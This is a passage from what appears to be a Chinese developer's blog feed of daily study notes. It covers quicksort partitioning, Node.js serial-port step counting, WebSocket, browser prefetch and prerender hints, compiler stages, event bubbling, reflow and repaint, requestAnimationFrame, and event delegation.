class="keyword">let</span> pivot = arr[low]</span><br><span class="line">                <span class="keyword">while</span>(low&lt;high)&#123;</span><br><span class="line">                    <span class="keyword">while</span>(low&lt;high&amp;&amp;arr[high]&gt;=pivot) --high</span><br><span class="line">                    arr[low] = arr[high]</span><br><span class="line">                    <span class="keyword">while</span>(low&lt;high&amp;&amp;arr[low]&lt;=pivot) ++low</span><br><span class="line">                    arr[high] = arr[low]</span><br><span class="line">                    <span class="built_in">console</span>.log(arr)</span><br><span class="line">                &#125;</span><br><span class="line">                arr[low]=pivot</span><br><span class="line">            &#125;</span><br><span class="line">            sort(arr) <span class="comment">//[1, 2, 3, 4, 5, 6, 8, 7]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//过程如下，最终小于4的在左面，大于4的在右面</span></span><br><span class="line"><span class="comment">// [4, 7, 6, 5, 3, 2, 8, 1]</span></span><br><span class="line"><span class="comment">// [1, 7, 6, 5, 3, 2, 8, 7]</span></span><br><span class="line"><span class="comment">// [1, 2, 6, 5, 3, 6, 8, 7]</span></span><br><span class="line"><span class="comment">// [1, 2, 3, 5, 5, 6, 8, 7]</span></span><br><span class="line"><span class="comment">// [1, 2, 3, 5, 5, 6, 8, 7]</span></span><br><span class="line"><span class="comment">// [1, 2, 3, 4, 5, 6, 8, 7]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//优化：</span></span><br><span class="line"><span class="comment">//1.子序列的规模较小时，不用在递归调用快排，可以采取直接插入排序</span></span><br><span class="line"><span class="comment">//2.尽量选一个可以将数据中分的枢纽元素，比如从序列的头，中，尾选3个，取这三个值的中间元素为枢纽</span></span><br></pre></td></tr></table></figure><h2 id="2-看一遍之前Node-js的博客"><a href="#2-看一遍之前Node-js的博客" class="headerlink" title="2.看一遍之前Node.js的博客"></a>2.看一遍之前Node.js的博客</h2><h3 id="（1）Nodejs区别于传统应用的特点："><a href="#（1）Nodejs区别于传统应用的特点：" class="headerlink" title="（1）Nodejs区别于传统应用的特点："></a>（1）Nodejs区别于传统应用的特点：</h3><ol><li>异步事件驱动：当异步函数执行时，不确定何时执行完毕，回调函数会被压入到一个事件循环队列，然后往下执行其他代码，直到异步函数执行完成后，才会开始处理事件循环，调用相应的回调函数。事件循环队列为先进先出队列，按顺序执行。 </li><li>非堵塞I/O：Nodejs提供的很多模块中都是异步执行的。比如，文件操作的函数。 </li><li>单线程（这里指主线程）</li><li>性能出众：底层选择用c++和v8来实现的，上面第一点讲到过，nodejs的事件驱动机制，这意味着面对大规模的http请求，nodejs是凭借事件驱动来完成的，性能部分是不用担心的，并且很出色</li></ol><h3 id="（2）Nodejs应用场景"><a href="#（2）Nodejs应用场景" class="headerlink" title="（2）Nodejs应用场景"></a>（2）Nodejs应用场景</h3><p>适合I/O密集型的应用，如在线多人聊天，多人在线小游戏，实时新闻，博客，微博之类的。</p><p>不适合的场景有：cpu密集型的应用，如计算圆周率，视频解码等业务场景较多的。</p><h3 id="（3）什么是CPU密集与IP密集"><a href="#（3）什么是CPU密集与IP密集" class="headerlink" title="（3）什么是CPU密集与IP密集"></a>（3）什么是CPU密集与IP密集</h3><p>CPU 密集的程序一般而言CPU占用率相当高，任务本身不太需要访问I/O设备 。</p><p>I/O 密集的程序一般CPU占用率较低。任务本身需要大量I/O操作 。比起阻塞IO要优秀的多。</p><h2 id="3-Node-js串口通信与计步算法"><a href="#3-Node-js串口通信与计步算法" class="headerlink" title="3.Node.js串口通信与计步算法"></a>3.Node.js串口通信与计步算法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开发板程序</span></span><br><span class="line"><span class="keyword">void</span> sendPacket()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 向Tcp服务器发送多个数据包</span></span><br><span class="line">sprintf(g_cBsdBuf, <span class="string">"\n\r\t%d,%d,%d\n\r"</span>, g_cAccX, g_cAccY, g_cAccZ);</span><br><span class="line">    <span class="comment">// 发送格式字符串的形式</span></span><br><span class="line">    UART_PRINT(<span class="string">"%s"</span>, g_cBsdBuf);</span><br><span class="line">    <span class="comment">// 发送数据包</span></span><br><span class="line">    sl_Send(g_sockID, g_cBsdBuf, <span class="number">40</span>, <span class="number">0</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//串口通信</span></span><br><span class="line"><span class="keyword">var</span> SerialPort = <span class="built_in">require</span>(<span class="string">"serialport"</span>).SerialPort;  <span class="comment">//引入模块</span></span><br><span class="line"><span class="keyword">var</span> portName = <span class="string">'COM3'</span>; <span class="comment">//定义串口名</span></span><br><span class="line"><span class="keyword">var</span> serialPort = <span class="keyword">new</span> SerialPort(</span><br><span class="line"> <span class="string">"COM3"</span>, &#123;</span><br><span class="line">   baudRate: <span class="number">9600</span>,  <span class="comment">//波特率</span></span><br><span class="line">   dataBits: <span class="number">8</span>,    <span class="comment">//数据位</span></span><br><span class="line">   parity: <span class="string">'none'</span>,   <span class="comment">//奇偶校验</span></span><br><span class="line">   stopBits: <span class="number">1</span>,   <span class="comment">//停止位</span></span><br><span class="line">   flowControl: <span class="literal">false</span> </span><br><span class="line">&#125;, <span class="literal">false</span>); </span><br><span class="line">serialPort.open(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123; </span><br><span class="line">   <span class="keyword">if</span>(error)&#123; </span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">"打开端口"</span>+portName+<span class="string">"错误："</span>+error);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">"打开端口成功，正在监听数据中"</span>);</span><br><span class="line">     serialPort.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(data);</span><br><span class="line">     &#125;)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="计步算法"><a href="#计步算法" class="headerlink" title="计步算法"></a>计步算法</h3><p>我们已知，用户在水平步行运动中，与地面垂直和前进两个加速度会呈现周期性变化，图像类似于正弦曲线，而与前进方向垂直的方向的加速度变化并不会太大。所以我们可以通过对曲线的峰值进行检测计算和加速度阀值决策，即可实时计算用户运动的步数。因为用户在运动中可能用手平持设备，或者将设备置于口袋中。所以，设备的放置方向不定。为此，通过计算三个加速度的矢量长度，我们可以获得一条步行运动的类似于正弦曲线的轨迹。</p><p>在波形图中存在波峰和波谷，检测步数其实就是检测波峰或者波谷。每两次波峰或波谷即可算作用户走了一步，这是该算法的主要原理。但是我们需要解决无效波峰的问题，避免一些因素对计步的干扰。</p><p>无效波峰的产生有两种原因：</p><ol><li><p>低幅抖动：由于不确定因素，设备可能发生一些微小的抖动，虽然出现了波峰与波谷，但并不能计入步数，对于这一干扰我们可以设定阈值来解决。</p></li><li><p>快频抖动：由于不确定因素，设备可能发生快速的抖动（不包括跑步状态），虽然存在波峰波谷而且阈值满足要求，但是数据并不满足正常人走路的频率，对于这一干扰我们可以设定时间间隔，也就是说相邻两步的时间间隔的至少大于某一数值，我们过滤掉其中的高频数据来解决。</p></li></ol><h2 id="4-关于WebSocket"><a href="#4-关于WebSocket" class="headerlink" title="4.关于WebSocket"></a>4.关于WebSocket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Websocket是HTML5新增的一种全双工通信协议，客户端和服务端基于TCP握手连接成功后，两者之间就可以建立持久性的连接，实现双向数据传输。</span><br><span class="line"></span><br><span class="line">socket是TCP/IP的封装，是一个接口。websocket是应用层的。</span><br></pre></td></tr></table></figure><h3 id="为什么要用-websocket"><a href="#为什么要用-websocket" class="headerlink" title="为什么要用 websocket"></a>为什么要用 websocket</h3><p>websocket 协议和 http 协议类似，http 协议有一个缺陷，只能由客户方端发起请求，服务端根据请求 url 和传过去的参数返回对应结果</p><p>websocket 是双向通信的，只要 websocket 连接建立起来，可以由客户端给服务端发送数据，也可以由服务端主动给客户端发送数据</p><h2 id="5-关于前端性能优化"><a href="#5-关于前端性能优化" class="headerlink" title="5.关于前端性能优化"></a>5.关于前端性能优化</h2><p>（1）雪碧图：将多张图片合并成一张图片后，下载全部所需的资源，只需一次请求。可以减小消耗 </p><p>（2）预加载：HTML5，prefetch预加载</p><p><strong>有了浏览器缓存，为何还需要预加载？</strong></p><ul><li>用户可能是第一次访问网站，此时还无缓存</li><li>用户可能清空了缓存</li><li>缓存可能已经过期，资源将重新加载</li><li>用户访问的缓存文件可能不是最新的，需要重新加载</li></ul><p><strong>Chrome 的预加载技术</strong></p><p>现在的 chrome 聪明到根据你的浏览记录，预测到你可能访问或搜索哪些网站，在你打开网站之前就加载好了一些资源了。<br>举个栗子，当你在搜索框输入 “amaz” 时，它猜测到你可能要访问 amazon.com，可能就帮你加载了这个网站的一些资源。<br>如果这个预测算法精准的话，就能大大地提高用户的浏览体验了。</p><p><strong>DNS prefetch</strong></p><p>我们知道，当我们访问一个网站如 <a href="http://www.amazon.com" target="_blank" rel="noopener">www.amazon.com</a> 时，需要将这个域名先转化为对应的 IP 地址，这是一个非常耗时的过程。</p><p>DNS prefetch 分析这个页面需要的资源所在的域名，浏览器空闲时提前将这些域名转化为 IP 地址，真正请求资源时就避免了上述这个过程的时间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&apos;x-dns-prefetch-control&apos; content=&apos;on&apos;&gt;</span><br><span class="line">&lt;link rel=&apos;dns-prefetch&apos; href=&apos;http://g-ecx.images-amazon.com&apos;&gt;</span><br><span class="line">&lt;link rel=&apos;dns-prefetch&apos; href=&apos;http://z-ecx.images-amazon.com&apos;&gt;</span><br><span class="line">&lt;link rel=&apos;dns-prefetch&apos; href=&apos;http://ecx.images-amazon.com&apos;&gt;</span><br><span class="line">&lt;link rel=&apos;dns-prefetch&apos; href=&apos;http://completion.amazon.com&apos;&gt;</span><br><span class="line">&lt;link rel=&apos;dns-prefetch&apos; href=&apos;http://fls-na.amazon.com&apos;&gt;</span><br></pre></td></tr></table></figure><p>应用场景1：我们的资源存在在不同的 CDN 中，那提前声明好这些资源的域名，就可以节省请求发生时产生的域名解析的时间。<br>应用场景2：如果我们知道用户接下来的操作一定会发起一起资源的请求，那就可以将这个资源进行 DNS-Prefetch，加强用户体验。</p><p><strong>Resource prefetch</strong></p><p>在 Chrome 下，我们可以用 link标签声明特定文件的预加载：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'subresource'</span> <span class="attr">href</span>=<span class="string">'critical.js'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'subresource'</span> <span class="attr">href</span>=<span class="string">'main.css'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'prefetch'</span> <span class="attr">href</span>=<span class="string">'secondary.js'</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在 Firefox 中或用 meta 标签声明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Link&quot; content=&quot;&lt;critical.js&gt;; rel=prefetch&quot;&gt;</span><br></pre></td></tr></table></figure><p>rel=’subresource’ 表示当前页面必须加载的资源，应该放到页面最顶端先加载，有最高的优先级。</p><p>rel=’prefetch’ 表示当 subresource 所有资源都加载完后，开始预加载这里指定的资源，有最低的优先级。</p><p>注意：只有可缓存的资源才进行预加载，否则浪费资源！</p><p><strong>Prerender</strong></p><p>前面说到的预解析DNS、预加载资源已经够强悍了有木有，可还有更厉害的预渲染（Pre-rendering）！</p><p>预渲染意味着我们提前加载好用户即将访问的下一个页面，否则进行预渲染这个页面将浪费资源，慎用！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&apos;prerender&apos; href=&apos;http://www.pagetoprerender.com&apos;&gt;</span><br></pre></td></tr></table></figure><p>rel=’prerender’ 表示浏览器会帮我们渲染但隐藏指定的页面，一旦我们访问这个页面，则秒开了！</p><p>在 Firefox 中或用 rel=’next’ 来声明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;next&quot; href=&quot;http://www.pagetoprerender.com&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="6-前端与编译原理"><a href="#6-前端与编译原理" class="headerlink" title="6.前端与编译原理"></a>6.前端与编译原理</h2><p>编译程序的逻辑结构：</p><p>对于编译型语言：词法分析，语法分析，语义处理，生成中间代码，代码优化，代码生成</p><p>对于解释型语言：通过词法分析和语法分析得到语法树后，就可以开始解释执行了。 </p><h3 id="（1）词法分析："><a href="#（1）词法分析：" class="headerlink" title="（1）词法分析："></a>（1）词法分析：</h3><p>词法分析阶段的任务是对输入的符号串形式的源程序进行最初的加工处理。 将字符流转为token流。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    a[index] = <span class="number">1</span>*<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">   ( <span class="number">1</span> )     a              标识符</span><br><span class="line">( <span class="number">2</span> )     [              左方括号</span><br><span class="line">( <span class="number">3</span> )    index           标识符</span><br><span class="line">( <span class="number">4</span> )     ]              右方括号</span><br><span class="line">( <span class="number">5</span> )     =              赋值</span><br><span class="line">( <span class="number">6</span> )     <span class="number">1</span>              整常数</span><br><span class="line">( <span class="number">7</span> )     *              乘号   </span><br><span class="line">( <span class="number">8</span> )     <span class="number">2</span>              整常数</span><br><span class="line">( <span class="number">9</span> )     ;              分号</span><br></pre></td></tr></table></figure><h3 id="（2）语法分析："><a href="#（2）语法分析：" class="headerlink" title="（2）语法分析："></a>（2）语法分析：</h3><p>对词法分析的结果进行语法检查, 并识别出单词序列所对应的语法范畴 。通常将语法分析的结果表示为分析树(parse tree)或语法树(syntax tree)。</p><h3 id="（3）预编译："><a href="#（3）预编译：" class="headerlink" title="（3）预编译："></a>（3）预编译：</h3><p>function函数”是一等公民！编译阶段，会把定义式的函数优先执行，也会把所有var变量创建，默认值为undefined，以提高程序的执行效率 </p><h3 id="（4）解释执行"><a href="#（4）解释执行" class="headerlink" title="（4）解释执行"></a>（4）解释执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">做了一个小型的C语言编译器，当时做了词法分析，实现的就是输入一个txt源文件，输出xml格式的结果。</span><br><span class="line">词法分析的是采用递归下降分析法，自己写了一些文法，但是范围不是很大。</span><br><span class="line"></span><br><span class="line">语法分析分为：自下而上分析，自上而下分析</span><br><span class="line"></span><br><span class="line">文法G=(Vn,Vt,P,Z)（grammar）</span><br><span class="line">Vn：非终结符号集（nonterminal vocabulary）</span><br><span class="line">Vt：终结符号集（V=Vn∪Vt，称为文法的字汇表）（terminal）</span><br><span class="line">P：产生式或规则的集合（principle）</span><br><span class="line">Z开始符号（识别符号）Z∈Vn</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.10</title>
      <link href="2020/03/10/%E6%97%A5%E5%B8%B8-2020.3.10/"/>
      <url>2020/03/10/%E6%97%A5%E5%B8%B8-2020.3.10/</url>
      
        <content type="html"><![CDATA[<ul><li>事件冒泡与事件捕获</li><li>重绘与回流</li><li>requestAnimationFrame 和 setTimeout 的区别 </li><li>事件委托机制</li><li>前端路由的实现方法</li><li>for in和for of的区别</li></ul><a id="more"></a><h2 id="事件冒泡与事件捕获"><a href="#事件冒泡与事件捕获" class="headerlink" title="事件冒泡与事件捕获"></a>事件冒泡与事件捕获</h2><ul><li><strong>事件冒泡</strong></li></ul><blockquote><p>当给父子元素的同一事件绑定方法的时候，触发子元素身上的事件，执行完毕之后，也会触发父级元素相同的事件，这种机制叫事件冒泡 </p></blockquote><ul><li>事件捕获</li></ul><blockquote><p>给父子元素用绑定同一事件时，当触发子元素身上的事件时，先触发父元素，然后在传递给子元素，这种传播机制叫事件捕获；</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"box1"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"box2"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"box3"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">sayBox3</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'你点了最里面的box'</span>);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">sayBox2</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'你点了最中间的box'</span>);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">sayBox1</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'你点了最外面的box'</span>);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 事件监听，第三个参数是布尔值，默认false，false是事件冒泡，true是事件捕获</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">'box3'</span>).addEventListener(<span class="string">'click'</span>, sayBox3, <span class="literal">false</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">'box2'</span>).addEventListener(<span class="string">'click'</span>, sayBox2, <span class="literal">false</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">'box1'</span>).addEventListener(<span class="string">'click'</span>, sayBox1, <span class="literal">false</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="重绘与回流"><a href="#重绘与回流" class="headerlink" title="重绘与回流"></a>重绘与回流</h2><p>在页面加载时，浏览器把获取到的HTML代码解析成1个DOM树。 DOM Tree 和样式结构体组合后构建render tree，render tree中每个NODE都有自己的style，而且render tree不包含隐藏的节点，因为这些节点不会用于呈现，而且不会影响呈现的。</p><p><img src="https://segmentfault.com/img/bVbaC2e?w=624&amp;h=289" alt="1"></p><h3 id="什么是回流"><a href="#什么是回流" class="headerlink" title="什么是回流"></a>什么是回流</h3><p>当render tree中的一部分(或全部)因为元素的规模尺寸，布局，隐藏等改变而需要重新构建。这就称为回流(reflow)。每个页面至少需要一次回流，就是在页面第一次加载的时候，这时候是一定会发生回流的，因为要构建render tree。在回流的时候，浏览器会使渲染树中受到影响的部分失效，并重新构造这部分渲染树，完成回流后，浏览器会重新绘制受影响的部分到屏幕中，该过程成为重绘。</p><h3 id="什么是重绘"><a href="#什么是重绘" class="headerlink" title="什么是重绘"></a>什么是重绘</h3><p>当render tree中的一些元素需要更新属性，而这些属性只是影响元素的外观，风格，而不会影响布局的，比如background-color。则就叫称为重绘。</p><h3 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h3><ul><li>回流必将引起重绘，而重绘不一定会引起回流。比如：只有颜色改变的时候就只会发生重绘而不会引起回流</li><li>当页面布局和几何属性改变时就需要回流。比如：添加或者删除可见的DOM元素，元素位置改变，元素尺寸改变——边距、填充、边框、宽度和高度，内容改变</li></ul><h3 id="浏览器的优化机制"><a href="#浏览器的优化机制" class="headerlink" title="浏览器的优化机制"></a>浏览器的优化机制</h3><p> 由于每次回流都会造成额外的计算消耗，因此大多数浏览器都会通过队列化修改并批量执行来优化回流过程。浏览器会将修改操作放入到队列里，直到过了一段时间或者操作达到了一个阈值，才清空队列。 </p><h3 id="如何减少回流，重绘"><a href="#如何减少回流，重绘" class="headerlink" title="如何减少回流，重绘"></a>如何减少回流，重绘</h3><ul><li>直接避免：采用transform,opacity可以直接跳过主线程，用compositer线程完成</li><li>合并多次对DOM和样式的修改</li><li>将复杂的元素绝对定位，脱离文档流，否则回流的代价很高。</li></ul><h2 id="requestAnimationFrame-和-setTimeout-的区别"><a href="#requestAnimationFrame-和-setTimeout-的区别" class="headerlink" title="requestAnimationFrame 和 setTimeout 的区别"></a>requestAnimationFrame 和 setTimeout 的区别</h2><h3 id="（1）seTimeout实现动画："><a href="#（1）seTimeout实现动画：" class="headerlink" title="（1）seTimeout实现动画："></a>（1）seTimeout实现动画：</h3><p>利用seTimeout实现的动画在某些低端机上会出现卡顿、抖动的现象</p><p>　　<strong>原因一</strong>、setTimeout的执行时间并不是确定的。在Javascript中， setTimeout 任务被放进了异步队列中，只有当主线程上的任务执行完以后，才会去检查该队列里的任务是否需要开始执行，因此 setTimeout 的实际执行时间一般要比其设定的时间晚一些。</p><p>　　<strong>原因二</strong>、刷新频率受屏幕分辨率和屏幕尺寸的影响，因此不同设备的屏幕刷新频率可能会不同，而 setTimeout只能设置一个固定的时间间隔，这个时间不一定和屏幕的刷新时间相同。</p><p>　　上两种情况都会导致setTimeout的执行步调和屏幕的刷新步调不一致，从而引起丢帧现象。</p><p><strong>setTimeout的执行只是在内存中对图像属性进行改变，这个变化必须要等到屏幕下次刷新时才会被更新到屏幕上。如果两者的步调不一致，就可能会导致中间某一帧的操作被跨越过去，而直接更新下一帧的图像。</strong></p><h3 id="（2）requestAnimationFrame实现动画："><a href="#（2）requestAnimationFrame实现动画：" class="headerlink" title="（2）requestAnimationFrame实现动画："></a>（2）<strong>requestAnimationFrame实现动画：</strong></h3><p>​    requestAnimationFrame最大的优势是由系统来决定回调函数的执行时机。</p><p>　　如果屏幕刷新率是60Hz,那么回调函数就每16.7ms被执行一次，如果刷新率是75Hz，那么这个时间间隔就变成了1000/75=13.3ms，换句话说就是，requestAnimationFrame的步伐跟着系统的刷新步伐走。它能保证回调函数在屏幕每一次的刷新间隔中只被执行一次，这样就不会引起丢帧现象，也不会导致动画出现卡顿的问题。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line">animation = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( num++ );</span><br><span class="line">animation = requestAnimationFrame(fn);<span class="comment">//异步</span></span><br><span class="line">&#125;</span><br><span class="line">fn();</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">cancelAnimation( animation );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="事件委托机制"><a href="#事件委托机制" class="headerlink" title="事件委托机制"></a>事件委托机制</h2><p>JavaScript高级程序设计上讲：事件委托就是利用事件冒泡，只指定一个事件处理程序，就可以管理某一类型的所有事件。 </p><h3 id="为什么要用事件委托"><a href="#为什么要用事件委托" class="headerlink" title="为什么要用事件委托"></a>为什么要用事件委托</h3><p>一般来说，dom需要有事件处理程序，我们都会直接给它设事件处理程序就好了，那如果是很多的dom需要添加事件处理呢？比如我们有100个li，每个li都有相同的click点击事件，可能我们会用for循环的方法，来遍历所有的li，然后给它们添加事件，那这么做会存在什么影响呢？</p><p>在JavaScript中，添加到页面上的事件处理程序数量将直接关系到页面的整体运行性能，因为需要不断的与dom节点进行交互，访问dom的次数越多，引起浏览器重绘与重排的次数也就越多，就会延长整个页面的交互就绪时间，这就是为什么性能优化的主要思想之一就是减少DOM操作的原因；如果要用事件委托，就会将所有的操作放到js程序里面，与dom的操作就只需要交互一次，这样就能大大的减少与dom的交互次数，提高性能；</p><p>每个函数都是一个对象，是对象就会占用内存，对象越多，内存占用率就越大，自然性能就越差了，比如上面的100个li，就要占用100个内存空间，如果用事件委托，那么我们就可以只对它的父级（如果只有一个父级）这一个对象进行操作，这样我们就需要一个内存空间就够了，是不是省了很多，自然性能就会更好。</p><p>如何实现呢？</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">'ul'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> oul = <span class="built_in">document</span>.getElementById(<span class="string">"ul"</span>);</span></span><br><span class="line"><span class="javascript">    oul.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">        alert(123);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--怎么知道点击的是那个li呢，通过事件对象，Event对象提供了一个属性叫target，可以返回事件的目标节点，我们称为事件源，--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">　　<span class="keyword">var</span> oul = <span class="built_in">document</span>.getElementById(<span class="string">"ul"</span>);</span></span><br><span class="line"><span class="javascript">　　oul.onclick = <span class="function"><span 